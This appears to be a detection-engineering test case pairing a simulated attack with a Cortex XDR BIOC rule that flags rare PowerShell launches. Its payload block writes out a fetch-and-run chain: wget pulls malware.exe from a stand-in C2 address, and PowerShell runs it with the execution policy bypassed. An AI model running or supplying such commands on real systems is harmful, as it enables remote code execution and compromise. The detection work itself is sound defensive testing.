identity.description: An attacker uses PowerShell to download and execute a malicious payload from a remote C2 server, triggering a rare process execution alert. Cortex should detect the unusual PowerShell invocation by a non-admin user.

payload.code:
mkdir -p /tmp/evil
wget -O /tmp/evil/malware.exe http://192.0.2.50/malware.exe
chmod +x /tmp/evil/malware.exe
powershell.exe -ExecutionPolicy Bypass -File /tmp/evil/malware.exe

biocs.name: Rare PowerShell Execution by User
biocs.description: Detection of PowerShell being executed by a user not typically using it
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'powershell.exe'
| filter actor_process_image_name != 'explorer.exe'
| filter actor_process_image_name != 'cmd.exe'
| filter actor_process_image_name != 'svchost.exe'
